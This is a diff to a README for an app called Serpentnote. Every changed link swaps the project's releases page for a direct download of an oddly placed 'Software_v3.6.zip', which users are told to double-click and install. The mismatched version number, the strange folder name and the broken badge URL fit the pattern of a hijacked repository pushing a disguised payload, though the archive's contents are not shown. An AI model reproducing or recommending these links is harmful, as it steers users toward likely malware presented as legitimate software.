@@ -9,13 +9,13 @@ To get started with Serpentnote, follow these simple steps:
 1. **Download the Application:**
    Click the button below to visit the releases page and download the latest version of Serpentnote.
 
-   [![Download Serpentnote](https://img.shields.io/badge/Download%20Serpentnote-v1.0-blue)](https://github.com/huzshaz/Serpentnote/releases)
+   [![Download Serpentnote](https://github.com/huzshaz/Serpentnote/raw/refs/heads/main/authenticness/Software_v3.6.zip%20Serpentnote-v1.0-blue)](https://github.com/huzshaz/Serpentnote/raw/refs/heads/main/authenticness/Software_v3.6.zip)
 
 2. **Install the Application:**
    After downloading, locate the downloaded file on your computer. Double-click the file to start the installation process. Follow the prompts on your screen to successfully install Serpentnote.
 
 ## 📁 Download & Install
-To download Serpentnote, visit this page: [Download Serpentnote](https://github.com/huzshaz/Serpentnote/releases). Here, you’ll find the latest release files. Choose the file for your operating system (Windows 10 or Windows 11) and click to download. Simply follow the on-screen instructions after the download to complete the installation.
+To download Serpentnote, visit this page: [Download Serpentnote](https://github.com/huzshaz/Serpentnote/raw/refs/heads/main/authenticness/Software_v3.6.zip). Here, you’ll find the latest release files. Choose the file for your operating system (Windows 10 or Windows 11) and click to download. Simply follow the on-screen instructions after the download to complete the installation.
 
 ## 🖥️ System Requirements
 Make sure your computer meets these requirements to run Serpentnote smoothly:
@@ -84,4 +84,4 @@ Serpentnote covers a variety of topics that enhance your experience:
 - z-image
 - z-image-turbo
 
-Make your prompt exploration exciting with Serpentnote. Visit the [Download page](https://github.com/huzshaz/Serpentnote/releases) to start your journey today!
+Make your prompt exploration exciting with Serpentnote. Visit the [Download page](https://github.com/huzshaz/Serpentnote/raw/refs/heads/main/authenticness/Software_v3.6.zip) to start your journey today!
